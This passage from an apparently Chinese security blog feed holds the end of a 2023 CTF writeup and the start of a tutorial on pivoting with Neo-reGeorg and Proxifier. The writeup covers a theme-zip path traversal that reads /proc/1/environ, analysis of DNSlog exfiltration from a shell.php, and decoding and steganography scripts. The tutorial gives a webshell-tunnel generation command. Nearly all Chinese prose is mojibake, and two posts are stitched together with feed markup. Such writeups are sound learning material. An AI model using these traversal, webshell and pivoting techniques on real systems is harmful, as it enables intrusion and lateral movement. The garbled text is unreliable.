<p>æ”¹ä¸ºâ€¦/â€¦/â€¦/â€¦/â€¦/â€¦/â€¦/â€¦/â€¦/â€¦/â€¦/â€¦/â€¦/â€¦/ï¼Œç„¶åå°†default_v2å‹ç¼©æˆzipåŒ…å³å¯</p>
<p><img src="/2023/04/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2023-%E4%B8%AA%E4%BA%BAWriteup/AgAABY8QiNaf4wAPc-RJk7v3y1mmM8dR.png" alt="img"><img src="/2023/04/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2023-%E4%B8%AA%E4%BA%BAWriteup/AgAABY8QiNYGfhQ5x9pFzqL0JOhu8dx5.png" alt="img"></p>
<p>å¯ç”¨æ–°ä¸»é¢˜ï¼Œæ‰¾flagçš„è·¯å¾„ï¼š</p>
<p><img src="/2023/04/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2023-%E4%B8%AA%E4%BA%BAWriteup/AgAABY8QiNYFNzsBlCNP1YeVPzLL4qsF.png" alt="img"></p>
<p>flagè·¯å¾„ï¼š  /proc/1/environ</p>
<p><img src="/2023/04/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2023-%E4%B8%AA%E4%BA%BAWriteup/AgAABY8QiNbnbUIWuPNI97f9mschRuvL.png" alt="img"></p>
<p>flag{bfd78316-a136-45e7-b04b-35af29af8313}</p>
<h2 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> Misc</h2>
<h3 id="hacker"><a class="markdownIt-Anchor" href="#hacker"></a> <strong>hacker</strong></h3>
<p>æ‰“å¼€çœ‹è§æµé‡åŒ…</p>
<p><img src="/2023/04/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2023-%E4%B8%AA%E4%BA%BAWriteup/AgAAEQXTVVLzFwbzAY5Kl4g6AwutqxD3.png" alt="img"></p>
<p>æå–httpæµé‡urlè§£å¯†å¹¶å®¡æŸ¥shell.phpï¼Œå‘ç°æ˜¯dnslogæ³¨å…¥</p>
<p><img src="/2023/04/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2023-%E4%B8%AA%E4%BA%BAWriteup/AgAAEQXTVVIzEeKyaWhDZ78kVncHWfjU.png" alt="img"></p>
<p>é€šè¿‡å®¡è®¡ä¸Šé¢ä»£ç å‘ç°æ˜¯å°†æ•°æ®å’Œadminçš„md5åçš„å¯†ç å¼‚æˆ–åå†çŸ­åŸŸåæ‹¼æ¥åå‘é€</p>
<p>å‘ç°SQLæ³¨å…¥æ³„éœ²adminå¯†ç çš„MD5</p>
<p><img src="/2023/04/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2023-%E4%B8%AA%E4%BA%BAWriteup/AgAAEQXTVVLJ7DaaXwNNr6dos9E5bTSG.png" alt="img"></p>
<p>å†çœ‹DNSæµé‡åŒ…</p>
<p><img src="/2023/04/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2023-%E4%B8%AA%E4%BA%BAWriteup/AgAAEQXTVVIy72j6btJP45aLNlzzGhDO.png" alt="img"></p>
<p>å†™è„šæœ¬è¾…åŠ©è§£å¯†</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">enc_data = <span class="string">b&quot;&quot;</span></span><br><span class="line">enc_data += binascii.unhexlify(<span class="string">b&#x27;7b357226771575227a7372237677702573611f372570317b76727720762066&#x27;</span>)</span><br><span class="line">key = <span class="string">&quot;8a3e684c923b763d252cf1e8734a7a29&quot;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    dec_data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i, byte <span class="keyword">in</span> <span class="built_in">enumerate</span>(enc_data):</span><br><span class="line">        dec_data += <span class="built_in">bytes</span>([byte ^ <span class="built_in">ord</span>(key[(i+k) % <span class="built_in">len</span>(key)])])</span><br><span class="line">    <span class="built_in">print</span>(dec_data)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>è„šæœ¬è§£å‡ºéƒ¨åˆ†flagï¼Œä½†éƒ¨åˆ†åŒ…æ•°æ®ä¸å¯è§£å¯†</p>
<p><img src="/2023/04/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2023-%E4%B8%AA%E4%BA%BAWriteup/AgAAEQXTVVJhzg5K3F5JDqgVLQrYJIVy.png" alt="img"></p>
<p>å…¶ä¸­æŠ¥æ–‡æœ‰éƒ¨åˆ†é”™è¯¯ï¼Œé€šè¿‡çˆ†ç ´å‘ç°åœ¨3æ®µæ»¡62å­—ç¬¦é•¿æ•°æ®åéƒ½æ·»åŠ 6å°±å¯ä»¥å¾—åˆ°çœŸå®å¯†æ–‡ä¸º</p>
<p>ACCAGTAAAACG{AATTCAACAACATGCTGC4CTACA-AACAAAAACAAT-TCATCAACAAAR-AACAACTGGTGA-TTCTTCTCATGATGAAA4AACTTCTTCTGCTGC}</p>
<p>é­”æ”¹è¿™ä¸ªDNAè§£å¯†è„šæœ¬<a href="https://github.com/karma9874/DNA-Cipher-Script-CTF">karma9874/DNA-Cipher-Script-CTF: A simple script to decode the genome DNA binary sequence (CTF Challenge) (github.com)</a></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> mapping = &#123; <span class="string">&#x27;AAA&#x27;</span>: <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;AAC&#x27;</span>: <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;AAG&#x27;</span>: <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;AAT&#x27;</span>: <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;ACA&#x27;</span>: <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;ACC&#x27;</span>: <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;ACG&#x27;</span>: <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;ACT&#x27;</span>: <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;AGA&#x27;</span>: <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;AGC&#x27;</span>: <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;AGG&#x27;</span>: <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;AGT&#x27;</span>: <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;ATA&#x27;</span>: <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;ATC&#x27;</span>: <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;ATG&#x27;</span>: <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;ATT&#x27;</span>: <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;CAA&#x27;</span>: <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;CAC&#x27;</span>: <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;CAG&#x27;</span>: <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;CAT&#x27;</span>: <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;CCA&#x27;</span>: <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;CCC&#x27;</span>: <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;CCG&#x27;</span>: <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;CCT&#x27;</span>: <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;CGA&#x27;</span>: <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;CGC&#x27;</span>: <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;CGG&#x27;</span>: <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;CGT&#x27;</span>: <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;CTA&#x27;</span>: <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;CTC&#x27;</span>: <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;CTG&#x27;</span>: <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;CTT&#x27;</span>: <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;GAA&#x27;</span>: <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;GAC&#x27;</span>: <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;GAG&#x27;</span>: <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;GAT&#x27;</span>: <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;GCA&#x27;</span>: <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;GCC&#x27;</span>: <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;GCG&#x27;</span>: <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;GCT&#x27;</span>: <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;GGA&#x27;</span>: <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;GGC&#x27;</span>: <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;GGG&#x27;</span>: <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;GGT&#x27;</span>: <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;GTA&#x27;</span>: <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;GTC&#x27;</span>: <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;GTG&#x27;</span>: <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;GTT&#x27;</span>: <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;TAA&#x27;</span>: <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;TAC&#x27;</span>: <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;TAG&#x27;</span>: <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;TAT&#x27;</span>: <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;TCA&#x27;</span>: <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;TCC&#x27;</span>: <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;TCG&#x27;</span>: <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;TCT&#x27;</span>: <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;TGA&#x27;</span>: <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;TGC&#x27;</span>: <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;TGG&#x27;</span>: <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;TGT&#x27;</span>: <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;TTA&#x27;</span>: <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;TTC&#x27;</span>: <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;TTG&#x27;</span>: <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;TTT&#x27;</span>: <span class="string">&#x27;.&#x27;</span> &#125;</span><br><span class="line"><span class="keyword">const</span> data = <span class="string">&quot;ACCAGTAAAACG&#123;AATTCAACAACATGCTGC4CTACA-AACAAAAACAAT-TCATCAACAAAR-AACAACTGGTGA-TTCTTCTCATGATGAAA4AACTTCTTCTGCTGC&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">let</span> flags = [];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> ra <span class="keyword">of</span> [<span class="string">&quot;A&quot;</span>, <span class="string">&quot;C&quot;</span>, <span class="string">&quot;G&quot;</span>, <span class="string">&quot;T&quot;</span>]) &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> rb <span class="keyword">of</span> [<span class="string">&quot;A&quot;</span>, <span class="string">&quot;C&quot;</span>, <span class="string">&quot;G&quot;</span>, <span class="string">&quot;T&quot;</span>]) &#123;</span><br><span class="line">    <span class="keyword">const</span> tmp = data.<span class="title function_">replaceAll</span>(<span class="string">&quot;4&quot;</span>, ra).<span class="title function_">replaceAll</span>(<span class="string">&quot;R&quot;</span>, rb);</span><br><span class="line">    <span class="keyword">const</span> groups = tmp.<span class="title function_">split</span>(<span class="regexp">/-|\&#123;|\&#125;/</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> datum <span class="keyword">of</span> groups) &#123;</span><br><span class="line">      <span class="keyword">const</span> slices = [...(datum.<span class="title function_">matchAll</span>(<span class="regexp">/[A-Z0-9]&#123;3&#125;/g</span>))]</span><br><span class="line">      <span class="keyword">let</span> flag_slice = <span class="string">&quot;&quot;</span>;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">const</span> slice <span class="keyword">of</span> slices) &#123;</span><br><span class="line">        flag_slice += mapping[slice[<span class="number">0</span>]];</span><br><span class="line">      &#125;</span><br><span class="line">      flags.<span class="title function_">push</span>(flag_slice);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> flag = flags.<span class="title function_">join</span>(<span class="string">&quot;-&quot;</span>).<span class="title function_">replace</span>(<span class="regexp">/flag-/</span>, <span class="string">&quot;flag&#123;&quot;</span>).<span class="title function_">replace</span>(<span class="regexp">/-$/</span>, <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">new</span> <span class="title class_">RegExp</span>(<span class="regexp">/flag\&#123;[a-f0-9\-]+\&#125;/</span>).<span class="title function_">test</span>(flag)) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(flag);</span><br><span class="line">    &#125;</span><br><span class="line">    flags = [];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">flag</span>&#123;d1ee664e-babd-<span class="number">11</span>ea-bb75-<span class="number">00155</span>db0066&#125;</span><br><span class="line"><span class="attribute">flag</span>&#123;d1ee664e-babd-<span class="number">11</span>eb-bb75-<span class="number">00155</span>db0066&#125;</span><br><span class="line"><span class="attribute">flag</span>&#123;d1ee664e-babd-<span class="number">11</span>ec-bb75-<span class="number">00155</span>db0066&#125;</span><br><span class="line"><span class="attribute">flag</span>&#123;d1ee664e-babd-<span class="number">11</span>ed-bb75-<span class="number">00155</span>db0066&#125;</span><br></pre></td></tr></table></figure>
<p>çˆ†ç ´å‡ºæ¥å››ä¸ªflagï¼Œä¾æ¬¡æäº¤ï¼Œæœ€åæ­£ç¡®flagä¸ºï¼š</p>
<p>flag{d1ee664e-babd-11ed-bb75-00155db0066}</p>
<h3 id="é˜¿å°¼äºš"><a class="markdownIt-Anchor" href="#é˜¿å°¼äºš"></a> <strong>é˜¿å°¼äºš</strong></h3>
<p>æ‰“å¼€å‘ç°</p>
<p><img src="/2023/04/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2023-%E4%B8%AA%E4%BA%BAWriteup/AgAAEQXTVVJUzn7bcutMjqxqdiKNgEhJ.png" alt="img"></p>
<p>å›¾ç‰‡åä¸ºnetpixeljihadï¼ŒçŒœæµ‹ä¸ºpixeljihadåŠ å¯†ï¼Œéœ€è¦å¯†ç </p>
<p>010æ‰“å¼€å›¾ç‰‡åå…­è¿›åˆ¶ï¼Œåœ¨æ–‡ä»¶å°¾å‘ç°å­—ç¬¦</p>
<p><img src="/2023/04/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2023-%E4%B8%AA%E4%BA%BAWriteup/AgAAEQXTVVIYpMRRvChGX5WNRvnxT2FS.png" alt="img"></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">6333383363333963633338326333616263333865633261616332613363326261633262636333623263326235633261356332623563333834633262316333613063333832633361623061</span><br></pre></td></tr></table></figure>
<p>cyberchefå¼€æ¢­2æ¬¡hexåç›´æ¥çˆ†ç ´</p>
<p><img src="/2023/04/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2023-%E4%B8%AA%E4%BA%BAWriteup/AgAAEQXTVVIztk02uANMJ7V5Z-SD9MLY.png" alt="img"></p>
<p>æ‰¾åˆ°å¯†ç ä¸ºç®€ç­”çš„ç¼–ç ï¼Œè§£å¯†</p>
<p><img src="/2023/04/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2023-%E4%B8%AA%E4%BA%BAWriteup/AgAAEQXTVVIApSOOUNtGkINauMcg8Pq1.png" alt="img"></p>
<p>å¾—åˆ°å‹ç¼©åŒ…å¯†ç </p>
<p>è§£å‹flagå‹ç¼©åŒ…</p>
<p><img src="/2023/04/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2023-%E4%B8%AA%E4%BA%BAWriteup/AgAAEQXTVVLi2GUdGHhPxbcTTSj5sK8Z.png" alt="img"></p>
<p>å¯†æ–‡ä¸ºä¸¤ç§å­—ç¬¦ï¼Œå°è¯•01ï¼Œé”™è¯¯</p>
<p>dcode.frå¼€æ¢­ï¼Œå‘ç°ä¸ºåä½å¯†ç </p>
<p><img src="/2023/04/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2023-%E4%B8%AA%E4%BA%BAWriteup/AgAAEQXTVVKA4dnNXOxNNqN6Znt9M9L5.png" alt="img"></p>
<p>å¾—åˆ°flag</p>
<h3 id="xå…‰çš„ç§˜å¯†"><a class="markdownIt-Anchor" href="#xå…‰çš„ç§˜å¯†"></a> Xå…‰çš„ç§˜å¯†</h3>
<p>PSé€å¸§æŸ¥çœ‹å›¾ç‰‡å‘ç°æœ€åä¸‰å¸§å›¾ç‰‡ä¸€æ ·çš„ï¼Œç¼–å†™è„šæœ¬æŒ‰å¸§å¯¼å‡ºï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pydicom</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">dcm = pydicom.dcmread(<span class="string">&#x27;task.dcm&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i, image <span class="keyword">in</span> <span class="built_in">enumerate</span>(dcm.pixel_array):</span><br><span class="line">    img = Image.fromarray(image)</span><br><span class="line">    img.save(<span class="string">f&#x27;Xray_<span class="subst">&#123;i&#125;</span>.png&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>æˆ–è€…åœ¨çº¿ç½‘ç«™ç›´æ¥DCMè½¬PNGä¹Ÿå¯ä»¥ï¼ˆ<a href="https://products.aspose.app/imaging/zh-hans/conversion/dcm-to-png/%EF%BC%89">https://products.aspose.app/imaging/zh-hans/conversion/dcm-to-png/ï¼‰</a></p>
<p>ç„¶åï¼Œæ€è·¯ä¸çŸ¥é“æ€ä¹ˆå¾€ä¸‹èµ°çš„æ—¶å€™æå–äº†æœ€åä¸‰å¸§å›¾ç‰‡çš„RGBå€¼ï¼Œå‘ç°éƒ½æ˜¯åªæœ‰ä¸€ä¸ªé€šé“ï¼Œç¼–å†™è„šæœ¬å°†ä¸‰å¼ å›¾ç‰‡çš„RGBé€šé“æå‡ºæ¥é‡æ–°ç»„æˆä¸€å¼ æ–°çš„å›¾ç‰‡ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">img1 = cv2.imread(<span class="string">&#x27;task.dcm_p18.png&#x27;</span>)</span><br><span class="line">r_channel = img1[:, :, <span class="number">0</span>]</span><br><span class="line">img2 = cv2.imread(<span class="string">&#x27;task.dcm_p19.png&#x27;</span>)</span><br><span class="line">g_channel = img2[:, :, <span class="number">1</span>]</span><br><span class="line">img3 = cv2.imread(<span class="string">&#x27;task.dcm_p20.png&#x27;</span>)</span><br><span class="line">b_channel = img3[:, :, <span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">new_img = np.zeros_like(img1)</span><br><span class="line">new_img[:, :, <span class="number">0</span>] = b_channel</span><br><span class="line">new_img[:, :, <span class="number">1</span>] = g_channel</span><br><span class="line">new_img[:, :, <span class="number">2</span>] = r_channel</span><br><span class="line"></span><br><span class="line">cv2.imwrite(<span class="string">&#x27;flag123.png&#x27;</span>, new_img)</span><br></pre></td></tr></table></figure>
<p><code>zsteg</code>æŸ¥çœ‹LSBéšå†™ï¼š</p>
<p><img src="/2023/04/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2023-%E4%B8%AA%E4%BA%BAWriteup/image-20230419221919826.png" alt="image-20230419221919826"></p>
<p>æå–å‡º</p>
<p><img src="/2023/04/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2023-%E4%B8%AA%E4%BA%BAWriteup/image-20230419222237979.png" alt="image-20230419222237979"></p>
<p>è·å–flagï¼š</p>
<p>flag{43159cf6-ff7f-47fc-a199-d14df05b9975}</p>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Misc</tag>
      </tags>
  </entry>
  <entry>
    <title>æµ…è°ˆå¦‚ä½•åˆ©ç”¨Neo-reGeorg+Proxifieråšè·³æ¿æœº</title>
    <url>/2023/04/%E6%B5%85%E8%B0%88%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8Neo-reGeorg+Proxifier%E5%81%9A%E8%B7%B3%E6%9D%BF%E6%9C%BA/</url>
    <content><![CDATA[<p>çªå‘å¥‡æƒ³çš„å†…ç½‘ç©¿é€å­¦ä¹ å¤–åŠ å¥½å¤§å“¥çš„æŒ‡å¯¼ï¼Œä¸»è¦æ˜¯è€å¤§å“¥çš„æ‰‹æŠŠæ‰‹æŒ‡å¯¼ï¼ï¼éå¸¸æ„Ÿè°¢Orzã€‚</p>
<span id="more"></span>
<h1 id="æµ…è°ˆå¦‚ä½•åˆ©ç”¨neo-regeorgproxifieråšè·³æ¿æœº"><a class="markdownIt-Anchor" href="#æµ…è°ˆå¦‚ä½•åˆ©ç”¨neo-regeorgproxifieråšè·³æ¿æœº"></a> æµ…è°ˆå¦‚ä½•åˆ©ç”¨Neo-reGeorg+Proxifieråšè·³æ¿æœº</h1>
<h2 id="regeorgsocksproxyå·¥ä½œåŸç†"><a class="markdownIt-Anchor" href="#regeorgsocksproxyå·¥ä½œåŸç†"></a> reGeorgSocksProxyå·¥ä½œåŸç†</h2>
<p>åœ¨æ¸—é€è¿‡ç¨‹ä¸­ï¼Œè¿›å…¥åˆ°å†…ç½‘ä¹‹åï¼Œç”±äºé˜²ç«å¢™çš„å­˜åœ¨ï¼Œè‡´ä½¿æˆ‘ä»¬æ— æ³•ç›´æ¥ä»å¤–ç½‘ä¸»æœºç›´æ¥è®¿é—®åˆ°å†…ç½‘ä¸»æœºï¼Œå‘èµ·é“¾æ¥ï¼Œå› æ­¤å°±éœ€è¦è®¾ç½®ç«¯å£åå¼¹ï¼Œå¦‚æœè¦å¯¹å†…ç½‘ä¸­çš„å…¶ä»–ä¸»æœºè¿›è¡Œæ¸—é€æ”»å‡»ï¼Œå°±éœ€è¦é€šè¿‡å†…ç½‘çš„ä»£ç†ï¼Œæ¥å¯¹å…¶ä»–ä¸»æœºè¿›è¡Œæ¸—é€æ”»å‡»ã€‚</p>
<p>ä¾‹å¦‚è¿™é‡Œæˆ‘ä»¬å‘ç°äº†ä¸€ä¸ªå†…ç½‘çš„é¶æœºï¼Œä½†æ˜¯æ²¡æ³•ç›´æ¥é“¾æ¥ï¼Œå°±å¯ä»¥é€šè¿‡<code>Neo-reGeorg+Proxifier</code>æ„å»ºçš„å†…ç½‘ä»£ç†éš§é“<code>Tunnel.php</code>åšä¸€ä¸ªè·³æ¿ï¼Œä½¿ç”¨ä»£ç†ä¸»æœºçš„å†…ç½‘æµé‡è®¿é—®å…¶ä»–å†…ç½‘ä¸»æœºï¼Œä»¥æ­¤æ¥åšåˆ°ä¸€ä¸ªåˆæ­¥æ¨ªå‘å’Œæ”»å‡»éšè—ã€‚</p>
<p><strong>åŸç†å›¾ï¼š</strong></p>
<p><img src="/2023/04/%E6%B5%85%E8%B0%88%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8Neo-reGeorg+Proxifier%E5%81%9A%E8%B7%B3%E6%9D%BF%E6%9C%BA/image-20230413220538532.png" alt></p>
<h3 id="ç®€è¿°neo-regeorg"><a class="markdownIt-Anchor" href="#ç®€è¿°neo-regeorg"></a> ç®€è¿°Neo-reGeorg</h3>
<p><code>Neo-reGeorg</code> æ˜¯<code>reGeorg</code>çš„é‡æ„ç‰ˆï¼Œå…¶ç›®çš„æ˜¯ï¼š</p>
<ul>
<li>æé«˜å¯ç”¨æ€§ï¼Œé¿å…ç‰¹å¾æ£€æµ‹</li>
<li>æé«˜ tunnel è¿æ¥å®‰å…¨æ€§</li>
<li>æé«˜ä¼ è¾“å†…å®¹ä¿å¯†æ€§</li>
<li>åº”å¯¹æ›´å¤šçš„ç½‘ç»œç¯å¢ƒåœºæ™¯ä¸‹ä½¿ç”¨</li>
</ul>
<p>ä¸»è¦æ˜¯æŠŠå†…ç½‘æœåŠ¡å™¨çš„ç«¯å£é€šè¿‡ <code>http/https</code> éš§é“è½¬å‘åˆ°æœ¬æœºï¼Œå½¢æˆä¸€ä¸ªå›è·¯ã€‚ç”¨äºç›®æ ‡æœåŠ¡å™¨åœ¨å†…ç½‘æˆ–åšäº†ç«¯å£ç­–ç•¥çš„æƒ…å†µä¸‹è¿æ¥ç›®æ ‡æœåŠ¡å™¨å†…éƒ¨å¼€æ”¾ç«¯å£ã€‚å®ƒåˆ©ç”¨<code> webshell</code> å»ºç«‹ä¸€ä¸ª <code>socks</code> ä»£ç†è¿›è¡Œå†…ç½‘ç©¿é€ï¼ŒæœåŠ¡å™¨å¿…é¡»æ”¯æŒ<code>php</code>ã€<code>aspx</code>ã€<code>ashx</code>ã€<code>jsp</code>ã€<code>go</code>è¿™äº› web ç¨‹åºä¸­çš„ä¸€ç§ã€‚</p>
<p><code>reGeorgSocksProxy</code>ç”±æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯ä¸¤éƒ¨åˆ†ç»„æˆã€‚æœåŠ¡ç«¯æœ‰<code>php</code>ã€<code>aspx</code>ã€<code>ashx</code>ã€<code>jsp</code>ã€<code>go</code>ç­‰å¤šä¸ªç‰ˆæœ¬ï¼Œå®¢æˆ·ç«¯åˆ™ç”±pythonç¼–å†™ã€‚å…¶å·¥ä½œåŸç†å¯ç®€å•æè¿°ä¸ºpythonå®¢æˆ·ç«¯åœ¨æœ¬åœ°ç›‘å¬ä¸€ä¸ªç«¯å£ï¼Œæä¾›socksæœåŠ¡ï¼Œå¹¶å°†æ•°æ®é€šè¿‡<code>http/https</code>åè®®å‘é€åˆ°æœåŠ¡ç«¯ä¸Šï¼Œå¹¶ä»æœåŠ¡ç«¯ä¸Šç”¨socketå®ç°è½¬å‘ã€‚</p>
<h2 id="å®éªŒæ¨¡æ‹Ÿæ‹“æ‰‘"><a class="markdownIt-Anchor" href="#å®éªŒæ¨¡æ‹Ÿæ‹“æ‰‘"></a> å®éªŒæ¨¡æ‹Ÿæ‹“æ‰‘</h2>
<p>æ‹“æ‰‘å›¾å¦‚ä¸‹ï¼š</p>
<p><img src="/2023/04/%E6%B5%85%E8%B0%88%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8Neo-reGeorg+Proxifier%E5%81%9A%E8%B7%B3%E6%9D%BF%E6%9C%BA/%E5%AE%9E%E9%AA%8C%E6%8B%93%E6%89%91%E5%9B%BE1.png" alt="å®éªŒæ‹“æ‰‘å›¾1"></p>
<p>ç”±äºå†…å®¹ä»…ä¾›è®²è§£ç¬”è®°ä½¿ç”¨ï¼ŒIPçš†ä¸ºä¸¾ä¾‹IPï¼Œæ˜¯æ— æ•ˆåœ°å€ï¼Œå…·ä½“æ­å»ºå‚è€ƒæ‹“æ‰‘å›¾ã€‚</p>
<p>**å¤–ç½‘æ¸—é€ä¸»æœºï¼š**192.0.0.1</p>
<p>**ç›®æ ‡ä¸»æœºï¼š**å¤–ç½‘vmnet0ç½‘å¡æ¨¡æ‹Ÿï¼ŒIPåœ°å€ä¸º192.0.0.1ï¼Œå†…ç½‘vmnet8æ¨¡æ‹Ÿï¼Œå†…ç½‘åœ°å€ä¸º192.0.253.123</p>
<p>**å†…ç½‘ä¸»æœºï¼š**ç½‘å¡ä¸ºvmnet8æ¨¡å¼ï¼ŒIPåœ°å€ä¸º192.0.253.123ï¼Œå¯ä¸ç›®æ ‡ä¸»æœº192.0.253.123å®ç°ç½‘ç»œäº’é€šï¼Œä½†ä¸å¯¹å¤–ç½‘æš´éœ²ã€‚é€šè¿‡ä»¥ä¸Šæ–¹å¼æ¨¡æ‹Ÿå†…ç½‘ç»“æ„ã€‚</p>
<h3 id="ä¸»æœºé…ç½®"><a class="markdownIt-Anchor" href="#ä¸»æœºé…ç½®"></a> ä¸»æœºé…ç½®</h3>
<h4 id="1-æ¸—é€ä¸»æœºç”Ÿæˆshellè„šæœ¬"><a class="markdownIt-Anchor" href="#1-æ¸—é€ä¸»æœºç”Ÿæˆshellè„šæœ¬"></a> 1ã€æ¸—é€ä¸»æœºç”Ÿæˆshellè„šæœ¬</h4>
<p>åœ¨Neo-reGeorgç›®å½•ä¸‹æ‰“å¼€powershellçª—å£ï¼Œæ‰§è¡Œè„šæœ¬ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python neoreg.py generate -k TWe1v3</span><br></pre></td></tr></table></figure>
<p>å›¾ä¸ºNeo-reGeorgè„šæœ¬æ‰§è¡Œï¼š</p>
